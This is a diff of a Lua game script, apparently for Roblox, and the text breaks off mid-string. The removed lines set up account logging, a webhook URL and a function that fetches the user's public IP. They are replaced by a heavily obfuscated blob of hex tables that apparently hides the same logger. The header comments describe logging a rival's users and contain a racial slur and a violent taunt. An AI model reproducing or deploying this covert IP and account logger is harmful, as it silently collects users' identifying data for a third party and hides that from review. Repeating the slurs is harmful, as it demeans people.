@@ -1,279 +1,76 @@
 -- логгает ток юзеров говноскрипта от пидора который думает шо может вьебать кейсистему на мои дбшки
 -- fuck you nigga, get pwned by FluttershyFrmDaO, opps get shot down by KingVon nigga!
-local loggedAccounts = {}
-local webhookURL = "https://fivehook.com/api/webhook/6a3bf2c3-e6f1-4dff-a391-a54b8c24c9c2"
-
-local function getIP()
-    local success, result = pcall(function()
-        return game:HttpGet("https://api.ipify.org?format=json")
-    end)
-    if success and result then
-        local data = game:GetService("HttpService"):JSONDecode(result)
-        return data.ip
-    end
-    return nil
+-- Protected by Mnx Obfuscator | Public Enemy
+local ysjl3VQZO8Rr_Tvn7J=type(nil)
+local x9rDCH27SA3RE=string.len("kNE_itOJQh")
+local plHdfkD_V=761
+local yxIjHHgyBCvmy=608
+if false then error("") end
+if false then error("") end
+local p22t6E0Et1op3=tostring(57)
+local ioerkThJmS5Ur=math.floor(0)
+do local _=nil end
+local ae6o33Gf8M={"510bcad95f06b304d0ff7feb4b77a4b8442672b40430f607ddde14c42a5bfcbc996d9004330d678d5c34cca2ea9cae70d88313e58c67213c8c064b781b88dd5","5b0ac6e486927a4911078beb317eadbcdf4922cc6f33e9a9e5000cb525f3da126b1ef40dee11eb933682047366b7d22e0d60ca58b83a38f52ea8097aeb4c705","acd6c9c06ce5e344bd5405a79ae9c5d29c61403d44a913ac3e8de39efca705b58abe4473e4a1dcfe3c23f658879f953e3f6039d7996f5383ddc177eb65dfc5b","4951aabf3b13168faaf98fd457c9b1e88f494d5d433dbae5fdddbf46e0366683302083198704c2a432c867f38f059bc351b52826711aa96b8045dade1a83b99","509692f2413e453497a224c781e27f704deabcc66409ebd38775bc52fec1c0f40c4f686f75bfb9e1ff8501d4955cc560dc60c5584ab9dc6054959e7ddb7b3e3","34b2be0301257a48f9b5ea47ce1d940070197b04","44c4254005d82bcf40a532809fa4becdcd620cd05d011a5fe36f4103073eaa14710b66315679636ad3342ed07069f7dbf3aea14e6141579c9af4dc3c64feb56","03f9264eb61896b4db8dd5d4947ed9c5bbcb9ff352119a1a2eed104b8bcb71f8b64dc8b1082bf66e6ffffc5404a61c971f06061d99133cc5717c77648dc6a3a","5ff9df27f75224e346c13ac57a1b61269408f7f9ddd4a16908bd9647f136758c1b40d9255d14aadd0bccacea24efd21e26f76198ed91db4d9acd1fdb514e7fd","2d562ee3aed27cd327b71b3e281db446b62b987a2d701261997716598aefebbf91f66b312262de2ec5e74e1d125d68bd1c23caffdae7c94aedd2f6ea75f1751","281364ff6b4ec797115d7de4497bae330ed91e6ba7719503b57fdb1fad0de77ed3f0a99eb7fc3e75e0c8518b8c0ad991e0603bf57c78042a4eb2e7f36ead230","5e774158b5230fc52f00d9f1f033bcf7549c27707c1387031d1377d4acee5cc3250399d8e447dd8ca92039913ff7519a2516f3b74bd5a5538ea4a318b3eef38","c9bc9c5290e53db40ab2a54a5aee0cc98c383a86bc6e9f696405ff02ffcd7bca528719ece0690fa28215cb26a12b36833e5bb4ad2f3e9b3723442d220612985","e18d83fb80b370a55a5470bf65e9d9efc4e1679699055097c1f0116712473df5e0242ce0fa9e3b75a7a30b263e6a226acd1c1a18d284cd3e54931f8ea255a6b","571805f706926f0ec20595ba49d69bfa54e4c3795fb5352cd5f495f2b5678ff4bd2e240218b69c09dad40eb68205e286d66c0b6f5253edce5460e3d11d4509c","968111afeca0d17da161285b607b66f83caa645e7501e610400a6523eda39ba6e4c4a3744ca6ec07f92b501a216886b1b33a4a54269a1397fe2a638c7411d72","39be1d12eb6a9a4e5551a56ce0b509941d8bae873391e149229f74ba36cc9fe761664f94e24aa046052b401a613e2079a9aefd8fa6524a2a365c963e5551d1d","ff41f7e8d492e0c7d772793221b89dd9d328e6c0dc8c5fa22e32bedd4bf651129d8336d4afd8201dbaebeea458e7dbe6b648cff4fdca26e17adba064e81d65e","9a441706d1fe05515c5cfa71d96533127c38dd66981d8ff46c1af11de5c6af51890157d0168fb433018e60cabe96128950aeaca29241d363657c58461037c41","d14619299d836754779d80fc7901d12792903ea5eb4705e2f7fd5361b9fc88f51b5d06f6105b9d1d8e31f04c1edb086b240433688947855e53557bcedfa191f","600d8ff617a067ea7b88dd2a4f2b3a87b51e61552f58270127dc1a35d803ad922d62f11bdd9b15300f2c4af5f7d4c0b1af8bf161c24348d54d53331011d05c0","a636f3eed6ffe1828c1789fd26c92fdf21319fb1bb47ea2112275c22903aaf57c0a711ad40b8dd90cc10cad05f9801078307e579f7e1a477d7d7c7a15e548d8","0d15d5e61db22b8bb2e9d4d1e75d079baa99b9ea75d83f06ba41695d4ace526dc519c5dd19f769c570c93ddaa6fa9038266a7f72bd28f3489538ce6ef4a2f4e","d49218d5f67a462b359cccd7dcc562f215bb2fe4ecb37a4e53851bdf1a4fa48c3fc3d5534ea19292606bbc956985178b7002b9956de61fe9d39742fbb9f492b","966e1ba2ea2a9673d45e0abccc48f42cc268c1d67af839ddab7b0f5f4110d0d6b575f2ebe7147d7a052bd0800dd7a1367ebb9ecc8d6fbd9c1f6d741f0ddf5cf","20fd634f348a9b4454b8548c5e2d961f328d1523bce8cbf82c447a66fd4aa3aea9f57f2b744b4472ba39e207c707c81ed926c4329f6e23381d06af21ec8959e","293f8368b3ccef32f53aa19e1c74fb6ce4f397437dbe9c3a01355761a1927c6fd8d6c43b5c8338d6a31866d0d136f34ef938b8d0996e9e1008dbdeb5c2c0ff3","cbae037436618ecd44887553843c1892d1551a4ec863433e492f0c333c7001a5e2c53690533650ccd0f176b7fc33dc5079dd471edc57101c33f6004129b5c24","85a5317099b5167b6664e8fbd69c0bfdb0a019f97bc98f492049e9d4cccc7d43ee713547f747ba46a27d440f97be3b9da1e83e5e588ec115f70bc20e3c4172b","a2377501ee7bbb58bd0b19b5aa1b1b2d292823f64f4e4d9c5cf006157935226b176f169e7cc98ad227d8fb01704d77eecdd5f10b55c13c06a215d5f66014e10","8beba2710d528d05adfd24b06027b1143bcf5360290975f2b65dbec42f0ca09eca73dfd7a937bde72d56982c418e31516caf1310286193c8876ea084ca3b349","7edb26ea91e0a432c09012fe0df640b392a03bdee6998e337471eaf64a4230ccb9cfbc0489282ff6707d90e661167c7bc00c4265238ff4411c4ebf514775389","265323271a935280ae76eebd3f796c9b91b650fa438fd4a3ca140971488f8c8ddd7b51b574911bec3dfc91660b488cd8e8722e7a402efa7e9489e8245928a75","95581998f95d532a41b0da06066392a61cfb34e4b8e6a686d8a31d00f4d4b56e7d17df0016f657890b26aa9099f28f1d38e96c8b9948a84d46fc24af3d17e69","66e30a28841563e9e18466811d2ee71761146d71c43e7cda3484cd643910733a67b2d2c9e0ae43136fff2fdb8b14fdb9ddd726bb4e03d4c601398b3e822ba81","3bae65a9a181272881c3f172a3c9494756580c438b24e64baccc8269f900b7b017fd398667fcda72f2a34c97532532ff8045a9edc95c108e607a7bdd90868eb","889ab2c92804973b5a1e9efe294a2f6c24c88c5d9d18590f14591e1a7a19939c66a719e04d8659f8dcbaafa15a5a26a1017c8b5df3449c3d55edf0806559839","f64ebe3e4b468e9f403ebf0fb4410ca4e61a8e11551bc9698a098167cd028e636d70d946f3d04ef31cbfd0dd48402623649a5023e5d2a5465cf1bcf1d1f36bf","a04019509fcd87ffc0238f8f7469c44934d21ebd8a27156f1cb3d1466e49dbe35cca196fd8543beb4bd00448b582b8d72863348427f8c323d3b24ed3fe4ba25","ef31f5012896369c84eea5e7b5c1d00cef2830a26fd45b1de9d975e4a5ed73caa6e5734b0469c554ea129612884081e831bedf20c539661a28eccdc19c23c06","3dc4bf758e6bd0ed8750e6a3370c9dba12626632093d442f34ff6557e7470c056762efa5ae771e5064ac4a2090eedec8060498783bad5612624e135226b827b","208cc878c06691c0a6fd6e7a1cbf6e197403d3ff8533470486c69e17c67e73ce7f147d58aab906563c20f164d60f5b235348e26333ce76cd85c8bc76b5fd883","8964b41e2825b5206c7abcf349de53eb1c6ed4a2d5bc8a1326221d136c97091648b8136ac49be4f88f4e1e37cd9013529570d781755254d3c8bc6633f2d8d1c","3435aa83b082fcdfe35db77a281ea44bfc4b1e646befaeb78fa848072f0ce231e6d0d35650df4fc76e31e0743efa161c71650dde46f5a4f0a3709ba1de3e62e","fd1d2f91291409a4129b8fdf6bcc15288a123f5261dc601987e701951ecea41c236ccbc95ba680cec9debeee606b9e120f54f570369cfa69742ff56cb53f772","27989e4bf3b0d45ace6b8d4fba0b66317ad37534fd685469750820a938079dbd7b5a20b62c9578000008c009b67e0da934de1d5201838a083f3b504487526e8","591f5197ffe087b3c6c8f674e38e294dea377f4b3c8006aba1b402f501bea698b5036ff6ebf2187a5808c9f84ac773aee8b13128851c563600c5cdc2629bdf7","a89fff60a4f35d5571d7ff0ea2696fef091d38e0c8ef1fa0187d407daa24adf6a977bc30bef272ec8c5a8be9ac8840606573843ef20753f0cbd37a38b2dfc29","2cb8564806b1dcc33c613d2f5e5992e116d86976859450e3e5d1cfc3eba03792a83d55034695de60422301c49b296dbcd831ea90dcef123f8d65c18b642a446","5f9c2992ccb02c80be4381b7fd2fbd1b3387956448f9629050429ef040863e332f9ade221d41ba85c3b7ae32b1a5ceec7d41a3a091a174a34c10cfbdc566953","8cf0c4ed29704be51b625ce5ae2dd1766c4bdcdc808d3fddfca3e8bb18d53f1efb68862c0128a9b5eba27fa1089d93ad9982d7dc756d94849b428af5d5e407c","f74088ea262c0517badbbf6922fe3254de01ec70a8f1199baeff90cca00cd83406cc610ab044de3b75ccc3af6536a478bebd7abed9e59b84d596739e6a91dc8","43ee0b168b3f5486b51fda7b84f3c322f13e1100af9cec4f4377389090704e41140f5898ef73dca5e566d9ae42862afbeb6971dd5a529d5a00a09d4551df892","51c00a3505ec81ca58abde3796954ef92e37b8745d9b0184829a3b9f9175f4c6da92c8d6c264c69798908bc432fe87a03f11f3c639e376c259ed4fb6860cf9a","f01115c57d31f4755a0587cbf329bb3c623aab2d9c010df365322e2f2e74f25a8e3bf08a69afefd08ec33747f23e3d31f44891ed28bb089ba45ed5fcf09df86","b9fe8be1d1e6ad09eafff2477fdcc9c6ed0dc292679bdd2f81e9c5e5850491eef30ba98b2ecf0db8fb7f16957c0f10690b224439d2d17801e79e60a086522e8","ea28a30acfc4b068e023d9e1cf585159b8b77323dc26698ad8bcd95973917b95d89aaf9b3dc0b9ee1561fdfb4287820be429582ef1bcc52ce024ad68fbb0c10","45f0841534f663408788553c7e528ba2b972700856b82c8478234127b878574a6728b1a0a34c1e34dfc3d13b1808d39de2a61b88831d01c09859102a269e284","36c49aef149f22ef7c0df8c0278cf99f4bf022184f655a5a0333531a462284b997dc4daed958cbbf47f5c091cfbec0b8f8c58f064e7719727a7da5b1b8e1caa","eed36384fff1e6dd2cc74e2b1f303d32f4920262b822f8b23faa8d1031e99227f561950c3a3a16682dc74df48ffd0cfea97790a241d53a180af702fb863d5ae","a244dcc151bb4d454fb5ab76b067b6e714ef786ad3c7e0d5666b96d4548d2ad4dd4cd50a42388c682ae6c63cf9b4f96b8434dd9466ec57e06b25c516fcabbfd","8bd5f3340eab7c995a66ee1582006ef64874bf07d5132d2bad99384667c7e924dbcfa98f14d3661e6b71c6b45d1043d9fcc28819c344f38e24fb2f08968f978","3a5808b601df6c60ea2b9377deb4222a4a977950e36dc9bc01876a4e973a13d0fa13cfb062a7aa81d97854c5122f69df258fdfae87765e9d22eefbdf426cbaf","8a36d95c8b6d23f4a9bfe1a3e3cfa0c3d1a2c3401293349ea05891dddaac56abd8f83f0e0d94437bd06a490f649c81845080db5ada9c4b24681fffd4c0519ae","c27bac940bf5251f7fce499c87659e8f0151a4a081354d008b28440822f50fd3d459a01221f5fce17d055fd691ca7b4aa094158b825ca9aeae3e9a82012b7d0","3aefd3f8f911d916c120a706c2efcb52c65003ca03688b76d3d1c6aa76487c3edcf54d851df86dfbf99a71ad91603c83761efc351e7cf012cd1b8af93041bf1","55e2fa42b950f7e973e1994886c0139fc3665b0687ebb60357a16f83f0a532570f851bce044bf6fc2a74c3a03a3237aaccf624051971e7a432bdfabd5b08a50","97ee0c23fc86697bd97514e2c85e9916071db8b3486ecc73fdb493f17e2dbb7f59b058ceade10a1421c361dbe4e6380632c08d52fe9d81e97364ae3d5e06a3d","1341de726b24a23a3c1238f2a6b469973665932a4487fa1bd648c18664ca255f8200a12a494dec3f7e7a8f26bdf7a61810f41778ed7513978ec89543b5d9654","72fac9c402e4b7198016e2b3259807faf9541fe9703173bef333c228a664a6263294a5bc4ea55af438226d0335aaefbcc691ec13881b24686c541bc283e08d4","b6ce13802b6be8fd363eb799b17206bf4eb592b7fdf9edb59165bc6a706c51325d29e208014e5c96c95d4da10321050b793421bc14b905127a4637e543592b8","c0919cc59a7c2bf04d00bc61b0245a16a55a4d41e32a853efb224820026360cc444f7bd341a684415d00a54908b199ae3e04d4c93fd3042dbc9674c41e912cd","a4db6986b50605a494b0d93bf33ea421227e5ecf58333288af1f22679afd3fe2cc9ed86be8c897848c9b7b0de2fc6cebf24f69f834e1fa273939d5d6257f301","f116f0f0092401f33635330ad13f22a3298d7b845a4beb3c18c5f8f3d56113151ef2c84c9ca75d8affcde7c70b90e1a2c3dc19689aa68770c3a1433b628b67f","d89bfc38f8de05bf74903d582f137aaf7fdd6a5f493bfcbc8baacd67dc5564483da4278549691cf690562035456ca21ede34d93c251bd041df40ed51f9d2a24","41242e3b3eac0cb82412d058b72ddfd386f10dad15bf3c1d3c839a5cffee5e51f3422448b13cae5a20043c39e4d1d3e5cbbc80fe1353e30676e12e6518d0375","8c8c6aac9bbc1bdafc2c91e73dc51b0e5e7a52cd14dcd978eb04e514bb82bc5c5d051c9faf0dd05b2401c36601d1e61b31f88a5c82cc4a90965670f285b3059","f1d87f0999f902886a41658e33d06cdc440a0e709cc6f618a3290570839fa0140c1a94a03f30d689e5e672afe79cb272909f36283002d49b1f4b71ebfdfeb2c","1111e39b8d65918ff17efb12630ef08e6c5e4ba18b7af641e7690ef9ee81a0fadb6742c2192923bd8d4013a44e0a8abc0811d012912871911a41163391d44dc","34c2cff3568780d538470318864a5be4580b14386fba1e5c49fa790fa66b9ae167a0604d5c5a96ff168769e38160ea3757f773d16ee17217f497fe8ba5d9d23","20dd9dd15b03901119b56b21f994512b6ab6923c25406c38efbb5a430d47f4f4088b89ddb75f62a1bf7239747f8191d7b554e725e2a4070af3d8b75e975c39f","e03f3821164c00779d85e267d9b918661d8f605594ca0ccdc8b8aacea65848ee312d9cfa894bc80860aea489d5095a7d6964b0f36e3a89a0d21cf34a1476ba5","c9628d07905aca268e60324e668f39da055ef8d4dd023daf61e4375f3190424623c907019d94286e925eab38f1878d9e00e3ce786121c83dd61c8a92fa1699a","91ddaa3a897245d1aaf9c0457d285d3f2f1a1bcee6fba46f99a69f8bd54419f23edfe34edec595df869d6a47a94812cc0390ce2a5639a08bf82243c13b4c582","6e40b570e87a78c71c619b22d045db00265d3cd99edc85a2d85f4e5412b5ab9c9d1b8b62b4303b43617823a7cab59da0a6b047d3610962e4cd3e48ad382a0b5","433bf9b12cf5e09a332c3d84669d008318c145906b49a5d044c068b937187f9f0fbb62b7cba1c06ded4336c2209e37af0d1a2f388f5a3c1c5649048efc9c1af","a57547a53d849634cd1d57a194c8bf0f123eac6c02390f1987df8fb057e2eba7a529149a528616136e2d5a75a3d3ebdbaebd192c329f965f3ac9b04264d922a","8af9656427efe74d9df65e34eef570dd1a531c38459be4be6671caffc471d17eb90b8b3e36ac58ab696d1f89efd0a333bad3041adada923f60082f1224337ab","733b77b403c69eed228ca084f39f44fa06646291dc25df43b986c13dd8e0697f8eae569d4c66a94a1087378236b312c92c4831fa7a1f8460206fa54060eadc5","ecc059b2275fab7b0e088c7df716437f99caa5782f4564fc7cf315c6b0612626ca03986afeb80e75479f1c899a4366da6551bc75a1ad4e32f01771205719d6e","0116764785eb3a75720f1298a5215d69941cecaa43a80be344e35ba90fbbf77478f2f3c7db625286b5af752b5f149bc0075ea4cd0571a1202bb5eee48347d95","acf016e8921de2f1626247caf9856783a38359cb187676f9b0b37c475dfa4888ea13daeef4687b0f48e11c379bcbd27305d87eab31f114d6920846e07edb0e7","a6f7523d49672f5c6cd49fbff6a95736bd5c5fad0146bbc68ffb5ac77461315c16eba8cff14c33ab5a9c157df80af55bd21321cf7b66398ff16e67ab161035d","9bcc4d2c5c03e784195a3badcf88308e28fa6c31780a68c99665c7b78a7af4e08f44d61685ddf8daf986492c527006bcf238e9e9f3d99ef110637ab8933228e","f4ab2164fa412a50f7e84b60a13b9f72dc0694979f18dcf45672de2eb44948446e004fc0456cfc6104eeffdb2e6af28b3f67026f278e40b800380c84e329ba9","b9af167f26663fcd51578a7448f1d232a17443062f8b158a7f62d5dd30863dfe7205faf58c23df311606aa070af76abc47e88f407ae5d48e064e3836ca1ddf9","fed07154cd639ed99ed3e07574cee317d1586c8863400528dceafd85702c7fd39ceb138186744986e601de4404c44f47f5893b82c660720a90c276f22dd6241"}
+local bx5ZgOoBC60oEbD2BJ={57,92,72,85,51,97,95,30,31,47,91,33,15,20,60,70,89,82,93,42,65,84,59,35,16,50,63,83,66,18,78,52,36,12,4,5,79,69,45,74,23,46,11,81,71,49,22,96,73,39,58,7,43,38,41,64,68,55,3,86,44,2,75,88,9,54,40,6,61,10,19,77,87,13,53,21,29,28,67,14,26,32,90,27,37,76,80,1,25,62,34,48,8,56,17,94,24}
+local xzhM6xXOe0EJaIEL={"dd29ec1e32735dc084fa22ed0f40c273bdfea7c87fb0a2f312a87df89e588526dded644b0bb3a41e7e2d7203917641db118dcb9d150cb2b75daf38afeae66ad","81d6a0c3c6867ab785d6f4b87127b8f2c3791469c24bd75f955a0757aee5253c9ac0cca5b0ea133b6816dddbb63e48b77dfab871ac7149490e6722eb454ff16","387f957c422d99888a7352a9d94dff87a6baff093886b48e74fcea4979b3384c5667df2065f292913ef120f8e65dea48cdc53ee1e6b247f47771b964677e5aa","fa35a863c70c52fcdc48f0b70f04db8f89058113b3322a6f5589abc3bff35015650d2e22df7aadcddff6c5dc9c8a22383e2da18df0cc5296505a575d496f613","1c3cd39c9100d989c1ad8c8ca2a02e5dc5d456d5f3a04c66a594359c95ed71cdf6ef4be16f690bcb278f800b69e36b7bd774e1b9fcd2836a2110137d3c6329c","ff93fe07b19b9890737581cfc50790190e5a37e48ce61574b4cdd3ff940d219a2f9054999916e50ba4980a4312c3fa55d35dfb9d0804a5a051544ea1a49e9e1","a71eed756c4f5bc820b1fddf40f545730dd4b1d7deb51bb19d59e55f3f84e6172eaa7c94df9721a80df8d9fe18910c89a58fa57c7fc28eb403137d9b5d02f94","473599d1518a48ed16cbafe94258a9d8dc4c552acb7e6c6a950196b29fb74cf3a65d3f6f1c899a93ad2dd33470370874d429bbfe095a3b4399d2eeaa6da3f35","b2a9b48459340a82d36fadbb62728d869224d89c67184a055399dea9057df1a851da3c4f1396c4866d744135b591b1cc90303e06f4bc0d716cdaba76a644f77","f89661f8e4aea34342ba55ed8cf085b29ba9566a443c434f957e915712c7c847da4b92a8a2d54a94f43faa1cd6b74f5b57f6be4d7a65c892ef10c88aff965f7","b3ba00c06f54d173739d8abda6ad7bd9a08e6d80a9bfa1ad518dd0a73bab583e14a7be54a79babe67e78590d2ca5280f1494488ed51468f370f1320dabedb5d","35d72c41c4c67fd08d813213b08fd02ddb02a471da5970ac5ade4f355e76ce267815eb585c815286f81358841304135474437ea0d6dc9a20a6e460c0f85b631","bc26a6e7fa0a3c86f6467952b8b150e5d12f5d55737bbe7505b922188e0916357270427bae7e2ded685f892dd99fb788d2d32a914d97d0ccb54915f3f504338","9ff0114d0418c21af75440592904b483fdc88e9d7716e10f599867d6cd605fb5bb296c25c8c207e4cd706be51ee48e9a40aa05da19d75c5ca0bdb384fe2b40b","35a954b23df3e9d4112d0f79633703cd5fcff29d24bda1183c14a35b95f51a6137d485b6686363540cf214eb474b1f2fc2dda9e09d44bf898e3401af867f4c1","32c617a1270708d1dfcf716e3c4992846c42512fc4d06e6a31d28d4daf608f6357dc3206a9a6d6409f739bd27224fbcd71029faec67a7e68be28bb6d6c07b6d","6fb876d528583efa3cfc24f4d6089c4ee75ab46739b0caf7c95d63c7a3b878208baf3dfa64c8d0520d30b381c0df590d33a66fca34b7964e5bf1ba48e44c235","bad155c75918221358b3cf2288b0543bb7f2b2c9d314df2d1089ef8cc24a11326ba3c0b3e0735f03fd823e7f2573a749c5d6a22cbabb597d2ae7c6ed9967ad5","52921bfe611949965d85504e4eeb6c06d1c1aecbddac86b210107a7949d480be5f215144e4f2d8f00c23f47d9df5780310ec572c66825a6d426030863c6d75a","dd8f2f289a7b9a48051e677ded24ea29670770b6e18bf3def7c1667deb8b5b2613ede7a1ecd9eff655a34d197440a5b6eac984e0312cdeabb4ea58b939d3e75","1214a63598fbe78ddd509beea99fc0b873225ab48f56e3f8b42dad30c8f5f471b8251c90b299d73433c03e627f6bb5fe7a87273c7eacc2216d998024d71b6bb","7047dcb40bf2ce968a7a734b162359478b0ddc0946abfe0ddfb6bb46b2e0a29aefe03aae1c5148f2b7d8594c2717de30b0ca3a7b4ea7aad0f7d90fa1e168a2c","e40205449a5f72b82f39abbe8fb4f97efc317240dcfe2cf8ef01ec96b1602ee6e25a157654031cfe5fe4ea466e4d76df5dcfca6d8520f9d9462510baa3b25c3","5912dcd7f25b910ce4c916af09ee9dfe5fab1faf0fa54c1bd84a71362b26a92be5cf3f31146a61df5cc2fa8cd40a315d48bf55e91eaf495d21a73f85cbdeaa0","45385ef09cc15eb3031c206243c1c36b71668f31078784caaa9ee327728589a7ea6cdef390f39d3c64299bd588e20e57c043d044ead1f1ad7de10dd47614307","ee87ef4389278e01919f41fdb980deb63d73779711c95e62a1d0e4fad17db8aa4d587d48c4cb0bee7b0f1dd2e77a8fdd46e0df8043ea98d8480733d77799135","44c14be0e7a0a0091211ee6f0e2e62a2e5f92d500b00d0a2c642451fac749622715ae7e7814b5d8d75a5abea99954397c8f113c65223b06bfbcf8b15915874d","a7a733581ebe7d2f86ad10d56fe4a770f7dbabefa155757eb317c1d3b759e039c028e3b99d50d6d94fb5d5ec5f2651ef6d9befbbf4f66cc670bf5ee4524e62a","e4e0dc6e621d0c5bb107e11302daceae85b4036d0a71d70fa8d0994d6f693eade0d1338a95d944c47ffbb73e464483a938ced6f1445638d9137dfa16594e5ef","f50bf79c5a6caa3a4a5ca70427908b65c85293fd497eea5565968b5b82a57d30bedc7f97b3bf71ace919a25f277330a2d46b8b28d02f77180563a435ace7a2c","84180ab94bf16f88b8c4b4917cba8b40beafbedd5bf37f81edc518d0f461c9d2f7eae3aff30e1dbf6e85ad86192b545d1a2e8ae611fe279f9d30a38bdfd6138","0b45634a4d64ae13423857bd0c2313e342b2ce195a2da0d8736510dfb455e9c97d9408736f77ae646889321c0ffb2a969c7656940b768db3479bb129362b326","c9ae18b0c1067f9f90d937820a25917195c44cedb7764d459875d7e8ae98b2173eaf7254b93bcbab9d60f9fe6d4377e634ca83f8f9ff1a1f8b48568e2fce945","7f78977a0008a3715ddd041ed491638b10c25f24fdd936c9afeed5995cb64b7c91a2de0be93edf03111de9dc9b1a3b6cf19f346b41631cb54fa181938868343","eafa85360e8e8005909611a36e2a710a84af70295852e9d77c5fd32a2ccecabb2250b7a971b88af7b2b7ccd2e22dcb2ddd7d1c6a6324bfded1afd05941eea74","5d00f833e628267fb47374a792fc6c3cd981d59db33429f9df013dab41fe73503f9a07a8fcc5c917d86772097f6dc72b3029befb4047e2a23ad40b94feadb01","384e809ab1f63df673187c9e6582463bc96bfea5f63565f493d57e14c4d0ae73f1de2168d16fe769bd516e9fdcdd03b7ec2194dedab021142a1b4c5022bd307","c45c3c93f1806b10796587a7c631d1ff55e19da8b25a6022334e5e9c6237242beb77159e981fd6d9660dcd4a84f09443c2d95dc0b8d16e119c5f66708569dfa","9c859cf556b6ede717f5afe265b3dcd9c14c7f454c17de53bab093be49d1152d6777bffbf592c2f8b4aa25fdffe767c015e7d8bad88c21c8f6cfa20adcc0464","6428ee7a10f11a9c9214034caa89c01d475b3d0b551e1c5e7348ab7e4a0462eb294f794b03d1bb2719e2974eb6ad8ce16140ce978a5220dd5a6a3205b9d91c7","d12ce96c563feb7ffe76658b2febd3343f6bb09b8df9c93a16db3de5baaf12f1a95b04fe5cdf500800b08af73e82c19a0c58bd8fff509854cfaeac014688b56","b140b3a9df60350f80f7683bdbe4fb0be02f5fd67df221ca146eadf63e9aafa4aafffbebc3cdb394f4159280f82c5d8ed1f81619dd47af45e9e471189a552f2","715e04505c5dab36a435bc8d83663f2c542d1412157329405a349a14fcd094406aed38db065813eb156695d2a3f9b6c89bd9fdd6200fed4140fdcf3575a37ca","d096431105676d36917a3a1c0960c9e09e74a985ca209c3aaf55f6cc31f6f1bb027f80874dd92cd7bf4145d0a195f94f0d78f5b6fd41d61fdbfd3990442f9e6","07eab8de5837e91ce589a08bcb67864272fe759effe8949c17e704a8e87b6257d8af4b781f8de1e8009d72f8e91bd64ae7a73c5fedbaa3fcff6ad42dc9bcaa0","a1da7a53bb4dc470d7d34476092ab4b5ea25163d2a3cb396ef3351758aec4d51e82870fb77bbc33f797e96f753416a5b076fff6e5f557556ba3e7af2436a782","de08c9f03b143d47ecdee1c30deea46442cd1962b8f7564c8c176285cd0bfc8877a7d2c31f562f68faf1b4f53f501c0386fb5d54e65a3b785c9c8c650bea183","3d7f2cc9fd55ffe1f891fce1cf9ac458b8efa335c857ca5ab0e0c663118cdf0ca06d032f9c9e684fbe23324102b8f0e31659250c97d98e25487c49307f0af32","76adc16de8a80f0781707e63295abb52ca054aeac3229dc6b90ff08b98a3fc7694b2fdca850f32fe13898cf14f7d48ecf06fad723fa80ad6b62308a5baa1347","e9812991c0b4c42473b127527e6bcf81a369564552fe025b1e608513ab90dc2a3a993c0cd0f173590a5e5818b1e65dfc8de32dfd2c76d5b6c2b6e81eba31feb","00dfbe946a255e489d84dffb1102b95a1fd99b580fb316d120ab4116134b2a2dc5a66cd9c0a63ae11219d6fd289b44143ba246b85cda1707ab4d5898ef1b7e4","ac5fef1b07d2f55666fda2eac1e7673cfc1376aed26243a958089a3f5e6f6a647b49f0f8422b65a21e76eaba5cf423f8093b98744a329c94880ad402fa91b0d","40fbbc842ce4e530de7fe15f049dcdd6cd6c4eae4f0e3acd7da7742324c797aacd664fa248f2437a24a49eabfffe74f1fdd8a3b2046d04b51101f159bae8945","1af510dd7193035078f1dda2b3ed3503fccdbc7bd2ff1a1b344fbe026721f81f58eec4cfd694b216586e20243183a27d080a01c349abdf3ab51d067bc83c78c","e5105d047464b5c0e9f9618d557acbb90d6e0c07831f77395d8a3fd34cc2a78c65faf23aecc0e0ed402f0f18c82b35d0185e3fdb5947d4577e6f3ad82d31148","e9687b6160da91b18f663f9f07ed2a63fcdf533e5a4842531d8ab68c4bdb3b79e0c1cea0d7ae083f601b9a308b664a0e52d5f5c225f19eb8879daa3fc4e6f31","daaba52fea97501c85eb51d1f8d1720a90596c0ddd546ff87d53e936844bf039935f2f5d01f7f2fb5b848702fa5a5ae2a42db3f96e0226d6e1dd2bc3a265ac4","f050881f5590f1ca6d960a5f8f355f44792a5c820a9bcac7b9db3ee762fb8c0cd1d83657b085399ba0871f8794579cf0baebadc6cb0bd20435a49aa6429bf9b","d526cdf628901040e9fc5f6f6889c8c279668d9d037882cb5d7a344672d97e5285ad749a928d0bec783a0c68ee0a04e40522c2fbe159d5cfa3e3ac5d05dc22f","1eabfeafb77a292f9347f811fe4984c2ee1223b76b2e5c78268336fb9d563665087030196dca5b46c35a118165a131929eb7680d8b027e0cfdf935f909b3488","c3de09a338c4b352de5dc5a23a3d283f525b100458d68d834bd7eb21e090effb2a39cc19d473263fd553514b5181a3a84df0c96e2c811ccf04a1ffbba8ec713","214f11f54617e5057b116e275421b5dce247481eaf5ce566ca6f004ebf323c9705a4bd7d8ac883bc2b9b6f0dffd935234d6f9e91934ba21a83eaee3493f7b70","55f071ade305c828376d6c1df8afa361e9e972bf132672ebfba70646b5250591907c649cc4842e046178df5eeaec8550143fad2de2cb32740eae53d5e198d14","6896f764e10522558e0b167e671681e5d88b3702042d57779bae61947d9234329db056e9b9c39dc018fbf9db0480ca86cde28eab748525683e06a534c653deb","25b1422a988c094043fef956c0ce5f140ac8e0f9fa1bc53988d0c95152b90de7d7137875bee1332a948453ef9505f037a40e3eac282036543e51159eaf4758e","178ca760e6b88513d1e749ae47ba6634d4d73a87f880b50f7c1b8f9fa65f7d29c7ad1a65e700b1b2413475c3276139e915505be15e93776a5ff429f4362ee9c","455ebd5a6bab166fc761a68328dfeb076f5a10bcc8996f947a37524870c52b2bc5f0eeefdebbfb242353db3445e527034b99dcf15630f95cce48cd9b1c2e5df","0c5db4a01f7d04a39c4c89469e23b6bba0065ddaf84149fc31f97f414137d030378eee286c4e686436dd515e79703ea281cd56bc0d7b27713807b3a63a78e22","db4353e73eefff106aa3a48bc0a6fbd2ed7c84f8540d4085897c739cbea0db7a2afe2c71130326ab5c23cf98e24141dc25c9f83e194e3c2e655d3ba1cff785a","adb0930a43fefd4f6586465660c60bd54b954afde72030374d7bc3ff970743c026906519c0ff659898a1822794a6fc5e56af705602f3c305954ba758910c8b9","124a2eb01b6632f48fbce5895f1524a61e70cf4c4a3ef7b711999f0cef82d407f7a01a016247ea25119201e3b11c51ecaedc1c6d88ccc5f0aba5caf98d709cc","d0c9cedeaadfe9c5de07e9ee47c9557eac51c117a0c8c0ea5553c7bdf4fb2d6bae47febfefeb8245a9dcdaaad9c8b097057e369e25f6d9a1b46cf05bbeade24","04c87eb3b88240f7b383f3378b11ab4ab0ee1d9235f12606859681aad2d09bfa8ba09f930293864484e93d1a9b801190dfb25ea9c1a4570fbc4e815d9c6d398","e88a2e6f7dfce946053601de73960f603b306d76e410d3f7649c675953b922cbb454628d28761b8f6726fe1fbe2f